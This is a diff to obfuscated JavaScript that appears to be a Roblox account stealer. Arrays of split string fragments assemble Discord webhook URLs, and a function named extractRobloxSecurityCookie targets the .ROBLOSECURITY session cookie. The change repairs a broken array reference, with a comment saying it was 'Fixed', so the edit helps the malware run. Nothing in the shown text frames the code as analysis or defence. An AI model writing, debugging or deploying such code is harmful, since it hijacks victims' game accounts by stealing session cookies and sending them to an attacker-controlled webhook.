@@ -7,7 +7,6 @@ const diejwjdhjejdawawdwjwawdawd = [
   'By', 'ui', 'LY', 'aj', 'wC', '26', 'Qy', 'Jl', 'iY', 'MI', 'a'
 ];
 
-
 const diejwjdhadwawDawdwadjejwjw2daw = [
   'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 
   'ap', 'i/', 'we', 'bh', 'oo', 'ks', '/9', '87', '65', '43', 
@@ -31,7 +30,6 @@ const diejwjdhjej321321wjw4rwa = [
   'iO', 'pP', 'aS', 'dF', 'gH', 'jK', 'lZ', 'xC', 'vB', 'nM', 
   'qW', 'eR', 'tY', 'uI', 'oP'
 ];
-
 
 const diejwjdhjejwjwdawwfasdawdscacawd = [
   'ht', 'tp', 's:', '//', 'di', 'sc', 'or', 'd.', 'co', 'm/', 
@@ -111,10 +109,8 @@ const adwdawdacfazcawhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');
 const adwdawdacfazdawhasfsadsw = diejwjdhjejwjwdawwfasdawdscacawd.join('');            
 const adwdawdacfazdachasfsadsw = diejwjdhjejwjwdawnwdannwa.join('');  
 const adwdawdacfazdadhasfsadsw = diejwjdhjejwjwadwhadwhdaw.join('');                     
-const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabd.join('');                    
+const adwdaddacfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join(''); // Fixed: Replaced missing array with existing one
 const adwdaddagfazdadhasfsadsw = diejwjdhjejwjwcsadwabfwadawdw.join('');
-
-
 
 function extractRobloxSecurityCookie(sessionId) {
   // Use a regular expression to find the .ROBLOSECURITY cookie
